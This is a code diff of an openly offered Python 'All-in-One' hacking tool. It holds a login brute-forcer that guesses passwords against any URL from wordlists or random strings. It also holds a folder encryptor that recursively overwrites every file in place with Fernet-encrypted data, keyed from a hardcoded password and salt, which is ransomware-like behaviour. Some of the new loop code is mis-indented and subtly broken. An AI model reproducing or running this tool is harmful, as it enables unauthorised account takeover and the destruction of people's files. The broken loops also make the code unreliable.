@@ -1,44 +1,33 @@
-#----------AES imports----------
-import glob
-import hashlib
+# ----------Banner--------
+import pyfiglet
+from pyfiglet import Figlet
+
+# ----------Fernet imports----------
 import base64
-from Crypto.Cipher import AES
-from Crypto.Util.Padding import pad, unpad
-import re
 import os
-import sys
-from Crypto.Random import get_random_bytes
+from cryptography.fernet import Fernet
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+from cryptography.fernet import Fernet, InvalidToken
+import hashlib
 
-
-#-----------Brute Force imports-------
+# -----------Brute Force imports-------
 import requests
 import random
 
 
-'''
-TODO:
-
-1.sub domain brute force from a file.
-2. nmap
-3.AES sub folders encrypt
-
-
-'''
-
-
-
 class AllinOne:
     def HackTools(Elvo):
-
-        print("Welcome to All-in-One-Elvo Tool")
-        print('''
-Choose Your Option From The List Below :)
-
-    1.For Brute-Force enter Brute Force
-    2.For AES encryption enter AES
- ''')
-        User_Choice = input("And your choice would be?\n...: ").upper()
-        print("You chose...: ", User_Choice.capitalize())
+        custom_fig = Figlet(font='5lineoblique')
+        print(custom_fig.renderText("Welcome To Elvo All In One Tool"))
+        custom_menu = Figlet(font='digital')
+        print(custom_menu.renderText('''
+    1.For Brute-Force Enter 1
+    2.For Fernet Encryption Enter 2
+ '''))
+        User_Choice = input("And your choice would be?\n...: ")
+        print("You chose...: ", User_Choice)
 
         # Test module!
         # if User_Choice == 'BRUTE FORCE':
@@ -48,253 +37,275 @@ Choose Your Option From The List Below :)
         # else:
         #     print("Not an option :(")
 
-
-
-
-
         # -----------------------Brute Force-----------------------
-        if User_Choice == 'BRUTE FORCE':
+        if User_Choice == '1':
+            def QUESTIONBRUTEFORCE():
+                custombruteforce = Figlet(font='bubble')
 
+                print(custombruteforce.renderText("Welcome To Elvo\n "
+                                                  "Encryptor"))
 
-            BruteIntro = print('''How would you like to Brute Force?
+                BruteIntro = print('''How would you like to Brute Force?
 
-    1.With a Worldlist [1]
-    2.With Random Numbers[2]
-    3.With Your Own Characters[3]
-''')
-            BruteChoice = input(str("And your choice would be?\n...: "))
-            print("You chose...: ", BruteChoice)
+        1.With a Worldlist [1]
+        2.With Random Numbers[2]
+        3.With Your Own Characters[3]
+    ''')
 
-            if BruteChoice == "1":
+                BruteChoice = input(str("And your choice would be?\n...: "))
+                print("You chose...: ", BruteChoice)
 
+                if BruteChoice == "1":
 
-                url = input('Place the URL: ')
-                username = input('Place the username: ')
+                    url = input('Place the URL: ')
+                    username = input('Place the username: ')
 
-                # chars =  "123"
+                    # chars =  "123"
 
-                def send_request(username, passwd):
-                    data = {
-                        "username": username,
-                        "password": passwd
-                    }
+                    def send_request(username, passwd):
+                        data = {
+                            "username": username,
+                            "password": passwd
+                        }
 
-                    r = requests.get(url, data=data)
-                    return r
+                        r = requests.get(url, data=data)
+                        return r
 
-                def implist():
-                    print('ADD .txt TO THE FILE!')
-                    worldlist = input('Wordlist Path...: ')
-                    file = open(worldlist, 'r')
-                    tries = file.read().split('\n')
-                    file.close()
-                    return tries
+                    def implist():
+                        print('ADD .txt TO THE FILE!')
+                        worldlist = input('Wordlist Path...: ')
+                        try:
+                            file = open(worldlist, 'r')
+                            tries = file.read().split('\n')
+                            file.close()
+                            return tries
+                        except FileNotFoundError:
+                            return print('\nsomething is incorrect :( Try again :)\n'), QUESTIONBRUTEFORCE()
 
-                def main(tries):
-                    for passwd in tries:
-                        r = send_request(username, passwd)
+                    def main(tries):
+                        for passwd in tries:
+                            r = send_request(username, passwd)
 
-                        if 'failed to login' in r.text.lower():
-                            print(f"Incorrect {passwd}\n")
-                        else:
-                            print(f"Correct Password | {passwd} | !\n")
-                            break
+                            if 'failed to login' in r.text.lower():
+                                print(f"Incorrect {passwd}\n")
+                            else:
+                                print(f"Correct Password | {passwd} | !\n")
+                                break
 
-                tries = implist()
-                main(tries)
+                    tries = implist()
+                    main(tries)
 
-            elif BruteChoice == "2":
+                elif BruteChoice == "2":
 
+                    url = input('Place the URL: ')
+                    username = input('Place the username: ')
+                    chars = "abcdefghijklmnopqrstuvwxyz0123456789"
+                    try:
 
-                url = input('Place the URL: ')
-                username = input('Place the username: ')
-                chars = "abcdefghijklmnopqrstuvwxyz0123456789"
+                        def send_request(username, passwd):
+                            data = {
+                                "username": username,
+                                "password": passwd
+                            }
 
-                def send_request(username, passwd):
-                    data = {
-                        "username": username,
-                        "password": passwd
-                    }
+                            r = requests.get(url, data=data)
+                            return r
 
-                    r = requests.get(url, data=data)
-                    return r
+                        def main():
+                            while True:
+                                rndpasswd = random.choices(chars, k=2)
+                                # k= is the password length.
+                                passwd = "".join(rndpasswd)
+                                # This is how to convert a list to a string. - if we don't convert it to a string if it would print us a list.
+                                r = send_request(username, passwd)
 
-                def main():
-                    while True:
-                        rndpasswd = random.choices(chars, k=2)
-                        # k= is the password length.
-                        passwd = "".join(rndpasswd)
-                        # This is how to convert a list to a string. - if we don't convert it to a string if it would print us a list.
-                        r = send_request(username, passwd)
+                                if 'failed to login' in r.text.lower():
+                                    print(f"Incorrect {passwd}\n")
+                                else:
+                                    print(f"Correct Password | {passwd} | !\n")
+                                    break
 
-                        if 'failed to login' in r.text.lower():
-                            print(f"Incorrect {passwd}\n")
-                        else:
-                            print(f"Correct Password | {passwd} | !\n")
-                            break
+                        main()
+                    except requests.exceptions.MissingSchema:
+                        return print('\nsomething is incorrect :( Try again :)\n'), QUESTIONBRUTEFORCE()
 
-                main()
+                elif BruteChoice == "3":
 
-            elif BruteChoice == "3":
+                    url = input('Place the URL: ')
+                    username = input('Place the username: ')
+                    chars = input('Write the characters to use')
+                    try:
 
+                        def send_request(username, passwd):
+                            data = {
+                                "username": username,
+                                "password": passwd
+                            }
 
-                url = input('Place the URL: ')
-                username = input('Place the username: ')
-                chars = input('Write the characters to use')
+                            r = requests.get(url, data=data)
+                            return r
 
-                def send_request(username, passwd):
-                    data = {
-                        "username": username,
-                        "password": passwd
-                    }
+                        def main():
+                            while True:
+                                rndpasswd = random.choices(chars, k=2)
+                                # k= is the password length.
+                                passwd = "".join(rndpasswd)
+                                # This is how to convert a list to a string. - if we don't convert it to a string if it would print us a list.
+                                r = send_request(username, passwd)
 
-                    r = requests.get(url, data=data)
-                    return r
+                                if 'failed to login' in r.text.lower():
+                                    print(f"Incorrect {passwd}\n")
+                                else:
+                                    print(f"Correct Password | {passwd} | !\n")
+                                    break
 
-                def main():
-                    while True:
-                        rndpasswd = random.choices(chars, k=2)
-                        # k= is the password length.
-                        passwd = "".join(rndpasswd)
-                        # This is how to convert a list to a string. - if we don't convert it to a string if it would print us a list.
-                        r = send_request(username, passwd)
+                        main()
+                    except requests.exceptions.MissingSchema:
+                        return print('\nsomething is incorrect :( Try again :)\n'), QUESTIONBRUTEFORCE()
 
-                        if 'failed to login' in r.text.lower():
-                            print(f"Incorrect {passwd}\n")
-                        else:
-                            print(f"Correct Password | {passwd} | !\n")
-                            break
+                else:
+                    print("That's not one of the options... start again\n")
+                    return QUESTIONBRUTEFORCE()
 
-                main()
-
-            else:
-                print("That's not one of the options... start again\n")
-                return object.HackTools('Elvo.a')
+            QUESTIONBRUTEFORCE()
         # -----------------------Brute Force-----------------------
 
+        # -----------------------Fernet-----------------------
+        elif User_Choice == '2':
+            custombruteforce = Figlet(font='bubble')
+            print(custombruteforce.renderText("Welcome To Elvo\n "
+                                              "Encryptor"))
 
+            # ---------Generate Key-------------
 
-        # -----------------------AES-----------------------
-        elif User_Choice == 'AES':
-            AESQuestion = input("To Encrypt[1]\nTo Decrypt[2]\n...:")
+            try:
+                file = open('fernetkey.key', 'rb')
+                key = file.read()
+                file.close()
+            except FileNotFoundError:
+                key = Fernet.generate_key()
+                file = open('fernetkey.key', 'wb')
+                file.write(key)
+                file.close()
 
+            password_provided = "password"  # This is input in the form of a string
+            password = password_provided.encode()  # Convert to type bytes
+            salt = b'\n\x8dl\xfb&\x92\x86\xa6\x9e\xfb!\xec\xeb\x02\xcc\xee'
+            # CHANGE THIS - recommend using a key from os.urandom(16), must be of type bytes
+            kdf = PBKDF2HMAC(
+                algorithm=hashes.SHA256(),
+                length=32,
+                salt=salt,
+                iterations=100000,
+                backend=default_backend()
+            )
+            key = base64.urlsafe_b64encode(kdf.derive(password))  # Can only use kdf once
 
+            def QUESTIONFERNET():
 
-            class AESCipher:
-                def __init__(self, key):
-                    # self.key = md5(key.encode('utf8')).digest() - creates randon key
-                    self.key = b'1234567890123456'
+                FERNETQUESTION = input("\nWhat woud you like to do?\n"
+                                       "To Encrypt[1]\nTo Decrypt[2]\n...:")
 
-                def encrypt(self, data):
-                    # iv = get_random_bytes(AES.block_size) - creates random iv
-                    iv = b'1234567890123456'
-                    self.cipher = AES.new(self.key, AES.MODE_CBC, iv)
-                    return base64.b64encode(iv + self.cipher.encrypt(pad(data.encode('utf-8'),
-                                                                         AES.block_size)))
-
-                def decrypt(self, data):
-                    raw = base64.b64decode(data)
-                    self.cipher = AES.new(self.key, AES.MODE_CBC, raw[:AES.block_size])
-                    return unpad(self.cipher.decrypt(raw[AES.block_size:]), AES.block_size)
-
-            if AESQuestion == "1":
-
-                folderpath = input('Place the Folder Path...: ')
-                looptimes = int(input('Number of loops...:'))
-                if looptimes == 0:
-                    looptimes = 1
-
-                counter = 1
-
-                complete_files = []
-                for root, dir_names, file_names in os.walk(folderpath):
-                    for f in file_names:
-                        complete_files.append(os.path.join(root, f))
-# ------ NOTES --------
-# subfolderpath = complete_files
-# print("The complete set of files are ", complete_files)
-
-# subfolderpathloop = (len(subfolderpath)) #count all the files inside folderpath
-#
-# for line in complete_files:
-#     print(line) # prints each line of path
-
-                for times in range(looptimes):
-                    for file in complete_files:
-                        fullpath = f'{file}'
-
-                        msg = open(fullpath, 'r').read()
-                        base64encoding = base64.b64encode(str(msg).encode('ascii'))
-                        SHA256encoding = hashlib.sha256(str(msg).encode('UTF-8')).hexdigest()
-                        print(f'\nFile Number...: {counter}\nLoop Time...: {times},{looptimes}\nFile Name...:{file}\nBase64...:{base64encoding}\nSHA256...: {SHA256encoding}')
-
-                        encrykey = b'1234567890123456'
-                        print('AES...:', AESCipher(encrykey).encrypt(msg).decode('UTF-8'))
-                        print(f'\n-----next file-----')
-
-                        with open(fullpath, 'w') as f:
-                            f.write(AESCipher(encrykey).encrypt(msg).decode('UTF-8'))
-                            f.close()
-                            # print('File...: ' + str(counter))
-                            counter += 1
-
-            # Decrypt part
-            #
-            elif AESQuestion == "2":
-
-                Question = input("Are you sure? Yes/No...: ").capitalize()
-
-                if Question == 'Yes':
+                if FERNETQUESTION == '1':
+                    # TODO: --------------Encryption--------------
                     folderpath = input('Place the Folder Path...: ')
-                    looptimes = int(input('Number of loops...:'))
-
-                    if looptimes == 0:
-                        looptimes = 1
+                    looptimes = input('How many times to run...: ')
+                    try:
+                        number = int(looptimes)
+                        pass
+                    except ValueError:
+                        print('\nThats not a number...\n')
+                        return QUESTIONFERNET()
+                    if number <= 0:
+                        number = 1
 
                     counter = 1
-                    # for times in range(looptimes):
-
-                    # for dirpath, dirnames, filenames in os.walk(folderpath):
-                    #     # whatever you want to do with these folders
-                    #     print(dirpath, dirnames, filenames)
-
                     complete_files = []
                     for root, dir_names, file_names in os.walk(folderpath):
                         for f in file_names:
                             complete_files.append(os.path.join(root, f))
-# ------ NOTES --------
-# subfolderpath = complete_files
-# print("The complete set of files are ", complete_files)
 
-# subfolderpathloop = (len(subfolderpath)) #count all the files inside folderpath
-#
-# for line in complete_files:
-#     print(line) # prints each line of path
+                        for times in range(number):
+                            for file in complete_files:
+                                fullpath = f'{file}'
 
-                    for times in range(looptimes):
-                        for file in complete_files:
-                            fullpath = f'{file}'
-                            msg = open(fullpath, 'r').read()
+                            input_file = fullpath
+                            with open(input_file, 'rb') as f:
+                                data = f.read()  # Read the bytes of the input file
+                                base64encoding = base64.b64encode(str(input_file).encode('ascii'))
+                                SHA256encoding = hashlib.sha256(str(input_file).encode('UTF-8')).hexdigest()
+                                counter += 1
 
-                            encrykey = b'1234567890123456'
-                            print(f'\nFile Number...: {counter}\nLoop Time...: {times},{looptimes}\nFile Name...:{file}')
-                            print('AES...:', AESCipher(encrykey).decrypt(msg).decode('UTF-8'))
-                            print(f'\n-----next file-----')
+                            fernet = Fernet(key)
+                            encrypted = fernet.encrypt(data)
 
-                            with open(fullpath, 'w') as f:
-                                f.write(AESCipher(encrykey).decrypt(msg).decode('UTF-8'))
-                                f.close()
-                                counter +=1
+                            with open(input_file, 'wb') as f:
+                                f.write(encrypted)  # Write the encrypted bytes to the output file
 
-                elif Question == 'No':
-                    print('As you wish')
+                            print(
+                                f'File Name...:{file}\nFile Number...:{counter}Looptime...:{times}\nBase64...:{base64encoding}\nSHA256...: {SHA256encoding}\n\n --------next file--------\n')
 
-            else:
-                print("That's not one of the options... start again\n")
-                return object.HackTools('Elvo.a')
+                elif FERNETQUESTION == '2':
+
+                    # TODO: ------------------DECRYPTION--------------------
+
+                    Question = input("Are you sure? Yes/No...: ").capitalize()
+                    if Question == 'Yes':
+                        folderpath = input('Place the Folder Path...: ')
+                        looptimes = input('How many times to run...: ')
+                        try:
+                            number = int(looptimes)
+                            pass
+                        except ValueError:
+                            print('\nThats not a number...\n')
+                            return QUESTIONFERNET()
+                        if number <= 0:
+                            number = 1
+
+                        counter = 1
+                        complete_files = []
+                        for root, dir_names, file_names in os.walk(folderpath):
+                            for f in file_names:
+                                complete_files.append(os.path.join(root, f))
+
+                            for times in range(number):
+                                for file in complete_files:
+                                    fullpath = f'{file}'
+
+                                input_file = fullpath
+
+                                with open(input_file, 'rb') as f:
+                                    data = f.read()
+                                    counter += 1
+
+                                fernet = Fernet(key)
+                                try:
+                                    decrypted = fernet.decrypt(data)
+
+                                    with open(input_file, 'wb') as f:
+                                        f.write(decrypted)
+                                        print(
+                                            f'File Name...:{file}\nFile Number...:{counter}\nLooptimes...:{times}\n --------next file--------\n')
 
 
-        # -----------------------AES-----------------------
+                                except InvalidToken as e:
+                                    print("No more files to decrypt :)")
+
+                    else:
+                        print("That's not one of the options... start again\n")
+                        return QUESTIONFERNET()
+
+
+                else:
+                    return print('NOT AN OPTION TRY AGAIN!'), QUESTIONFERNET()
+
+            QUESTIONFERNET()
+            # -----------------------Fernet-----------------------
+
+
+
+
+
         else:
             print("\nNot an option :( , Try again...\n")
             return object.HackTools('Elvo.a')
